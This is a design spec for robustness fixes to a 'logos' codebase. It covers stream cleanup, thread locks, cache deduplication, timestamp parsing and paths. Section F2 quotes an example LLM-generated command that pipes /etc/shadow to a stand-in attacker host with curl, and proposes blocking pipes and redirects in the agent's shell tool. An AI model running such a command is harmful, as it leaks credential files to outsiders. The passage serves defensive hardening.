# Logos Robustness Fixes — Design Specification

Status: Draft
Date: 2026-03-24
Scope: logos/ (API, engine, data collectors, chat agent)

## Context

Systematic review of the logos subsystem identified 14 confirmed issues across API routes,
reactive engine, data collectors, and chat agent. This document specifies the fix design for
each issue, grouped into implementation batches.

---

## Batch 1 — Critical (security, resource leak, data loss)

### F1: SSE stream cleanup in agents.py

**Problem.** `event_generator()` in `routes/agents.py:92-100` has no `try/finally` block.
When a client disconnects mid-stream, the background `_stream()` task in `AgentRunManager`
continues running as an orphan. The subprocess keeps executing, and `is_running` stays True,
blocking all subsequent agent runs until the orphan completes or the server restarts.

`chat.py:236-249` has the correct pattern — `try/finally` that cancels both the generation
task and the cancel-monitor task.

**Additionally**, `AgentRunManager.shutdown()` (`sessions.py:138-140`) calls `cancel()` which
terminates the subprocess but never cancels `self._task`. On server shutdown, the task leaks.

**Fix design:**

1. Wrap `event_generator()` in `routes/agents.py` with `try/finally` that cancels the run
   on generator exit (client disconnect or completion).

2. In `sessions.py`, declare `self._task: asyncio.Task | None = None` in `__init__`.
   Update `shutdown()` to cancel and await the task after cancelling the subprocess.

**Files:** `logos/api/routes/agents.py`, `logos/api/sessions.py`

---

### F2: Shell command exfiltration via pipes

**Problem.** `run_shell_command` in `chat_agent.py:354-397` uses `create_subprocess_shell`
with prefix-only allowlist matching and permits pipe (`|`) and redirect (`>`) metacharacters.
An LLM-generated command like `cat /etc/shadow | curl -d @- https://attacker` passes all
checks.

**Fix design:** Block pipes and redirects in the metacharacter filter. Switch to
`create_subprocess_exec` with `shlex.split()` to eliminate shell interpretation entirely.

1. Add `|`, `>`, `<` to the blocked metacharacter list.
2. Replace `create_subprocess_shell` with `create_subprocess_exec` using `shlex.split(cmd)`.

`shlex` is already imported at module level for agent arg handling.

**Files:** `logos/chat_agent.py`

---

### F3: Delete dead cycle_mode.py

**Problem.** `routes/cycle_mode.py` imports from `shared.cycle_mode` which is deprecated.
The file is not registered in `app.py` but will cause `ImportError` when the shared module
is deleted. `working_mode.py:79-87` already provides deprecated compat aliases at the
`/cycle-mode` path.

**Fix design:** Delete `logos/api/routes/cycle_mode.py`.

**Files:** `logos/api/routes/cycle_mode.py` (delete)

---

## Batch 2 — Engine threading (race conditions, lock scope)

### F4: _clear_own_write lacks lock

**Problem.** `watcher.py:244-247` — `_clear_own_write()` runs on a timer thread and mutates
`_own_writes` and `_own_write_timers` without acquiring `self._lock`. Meanwhile, `_consume()`
on the event loop thread reads `_own_writes` at line 178, and `ignore_fn()` writes both dicts
under the lock at lines 233-242. Race condition on concurrent dict/set mutation.

**Fix design:** Acquire the lock in `_clear_own_write`:

```python
def _clear_own_write(self, path: Path) -> None:
    with self._lock:
        self._own_writes.discard(path)
        self._own_write_timers.pop(path, None)
```

**Also:** `_consume()` reads `self._own_writes` at line 178 WITHOUT the lock. Add lock
acquisition around the own-write check:

```python
with self._lock:
    if path in self._own_writes:
        self._own_writes.discard(path)
        _log.debug("Ignored own-write: %s", path)
        continue
```

**Files:** `logos/engine/watcher.py`

---

### F5: evaluate_rules holds lock during file I/O

**Problem.** `rules.py:64-88` — The `rule._lock` is held across `trigger_filter()` and
`produce()` calls, both of which can perform filesystem reads. Since the lock is
`threading.Lock` and this runs on the event loop thread, a slow disk read blocks the entire
lock scope. Additionally, when `produce()` raises an exception, `_last_fired` is never
updated, causing unbounded retry on every subsequent event.

**Fix design:** Split the lock into two scopes — cooldown check and cooldown update.
Move I/O (`trigger_filter`, `produce`) outside the lock. Update `_last_fired` even on
`produce()` failure to prevent spam.

**Trade-off:** A narrow window exists between the cooldown check and the cooldown update
where two concurrent events could both pass the cooldown check. This is acceptable because
(a) `evaluate_rules` runs on the single-threaded event loop, so true concurrency doesn't
occur, and (b) duplicate actions are deduplicated by `seen_names`.

**Files:** `logos/engine/rules.py`

---

### F6: Engine counters use relative path

**Problem.** `engine/__init__.py:30` — `_COUNTERS_PATH = Path("profiles/engine-counters.json")`
resolves against CWD. If the process starts from a different directory (e.g. systemd unit
with a different WorkingDirectory), counters silently fail to load/save.

**Fix design:** Make `_load_counters` and `_save_counters` require an explicit path parameter
(remove the default). Derive the path from `self._data_dir` (which is `PROFILES_DIR`) in
`ReactiveEngine.__init__`, and pass it explicitly at all call sites.

**Files:** `logos/engine/__init__.py`

---

## Batch 3 — Cache and data correctness

### F7: DataCache concurrent refresh

**Problem.** `cache.py` — `refresh_slow()` can be called concurrently from three independent
sources (background loop at line 167, reactive rule `collector-refresh`, reactive rule
`sdlc-event-logged`) with no dedup or locking. Two concurrent `_refresh_slow_sync()` calls
in the thread pool interleave field writes, producing a cache with mixed-generation data.

**Fix design:** Add an `asyncio.Lock` to prevent concurrent slow refreshes. If a refresh is
already in progress, the second caller skips:

```python
_slow_lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

async def refresh_slow(self) -> None:
    if self._slow_lock.locked():
        return  # skip, one already in flight
    async with self._slow_lock:
        await asyncio.to_thread(self._refresh_slow_sync)
        self._slow_refreshed_at = time.monotonic()
```

**Files:** `logos/api/cache.py`

---

### F8: GPU temperature_c never populated

**Problem.** `data/gpu.py:42-49` — `VramSnapshot.temperature_c` defaults to 0 and is never
set from the infra snapshot dict. Every consumer sees 0C.

**Fix design:** Add the field to the constructor call:

```python
temperature_c=gpu.get("temperature_c", 0),
```

**Files:** `logos/data/gpu.py`

---

### F9: cost.py string-compares ISO timestamps

**Problem.** `data/cost.py:155` — `start_time >= week_boundary` compares ISO timestamp
strings lexicographically. Fails when timezone formats differ (`Z` vs `+00:00`).

**Fix design:** Parse to datetime before comparing. Replace the string `week_boundary` with
a `datetime` object:

```python
week_boundary_dt = now - timedelta(days=7)

# In the loop:
try:
    obs_dt = datetime.fromisoformat(start_time)
except (ValueError, TypeError):
    continue
if obs_dt >= week_boundary_dt:
    this_week += cost
else:
    last_week += cost
```

**Files:** `logos/data/cost.py`

---

### F10: fortress.py unguarded json.loads

**Problem.** `routes/fortress.py:88,97,111` — Three endpoints call `json.loads(path.read_text())`
without error handling. Partially-written JSON files cause 500 errors.

**Fix design:** Extract a shared helper, consistent with the existing `_read_state_file`
pattern in the same file:

```python
def _read_json_or(path: Path, fallback: dict) -> dict:
    try:
        return json.loads(path.read_text())
    except (json.JSONDecodeError, OSError):
        return fallback
```

Apply to all three endpoints, using their existing `not path.exists()` fallback dicts.

**Files:** `logos/api/routes/fortress.py`

---

### F11: governance.py hardcoded PROFILES_DIR

**Problem.** `data/governance.py:28` defines
`PROFILES_DIR = Path.home() / "projects" / "hapax-council" / "profiles"` instead of importing
from `shared.config`. Diverges from every other module.

**Fix design:** Replace with `from shared.config import PROFILES_DIR`. Delete the local
`PROFILES_DIR` and `CONTRACTS_DIR` definitions.

**Files:** `logos/data/governance.py`

---

## Batch 4 — Minor robustness (non-blocking)

### ~~F12: decisions.py missing KeyError catch~~ (non-issue)

Dataclass `__init__` raises `TypeError` for both missing and extra kwargs. The existing
except clause already catches `TypeError`. No change needed.

---

### F13: consent.py private _contracts access

**Problem.** `routes/consent.py:183,267` accesses `registry._contracts` directly. If
`ConsentRegistry` internals change, these break silently.

**Fix design:** Check if `ConsentRegistry` exposes public methods for contract lookup.
If not, add `get_contract(id)` and `iter_contracts()` methods to the registry class, then
update the routes.

**Files:** `logos/api/routes/consent.py`, `shared/governance/consent.py` (if method needed)

---

### F14: flow.py sync handler

**Problem.** `routes/flow.py:110` — `def get_flow_state` is synchronous while all other
handlers are `async def`. FastAPI wraps it in a thread pool, which works but is inconsistent.

**Fix design:** Convert to `async def`. The function only reads `/dev/shm` files (memory-
backed, non-blocking) and accesses engine state, so async is appropriate.

**Files:** `logos/api/routes/flow.py`

---

## Implementation Order

```
Batch 1 (Critical)     Batch 2 (Engine)      Batch 3 (Data)       Batch 4 (Minor)
+-- F1: agents SSE     +-- F4: watcher lock   +-- F7: cache dedup   +-- F13: consent
+-- F2: shell safety   +-- F5: rules lock     +-- F8: gpu temp      +-- F14: flow async
+-- F3: delete cycle   +-- F6: counters path  +-- F9: cost compare
                                              +-- F10: fortress
                                              +-- F11: governance
```

Batches are independent and can be implemented in parallel. Within each batch, fixes are
independent unless noted.

## Testing Strategy

- **F1:** Manual test: start agent run, disconnect client, verify agent stops and subsequent
  runs succeed. Add unit test for `AgentRunManager.shutdown()` cancelling `_task`.
- **F2:** Unit test: verify pipe/redirect commands are rejected. Verify shlex.split + exec.
- **F3:** Verify `working_mode.py` compat aliases still serve `/cycle-mode`.
- **F4-F6:** Existing engine tests + new test for `_clear_own_write` under concurrent access.
- **F7:** Unit test: verify concurrent `refresh_slow()` calls produce skip, not interleave.
- **F8:** Check infra-snapshot.json for `temperature_c` key; verify it flows to API.
- **F9:** Unit test: compare timestamps with mismatched TZ formats.
- **F10-F14:** Covered by existing patterns; verify no regressions.
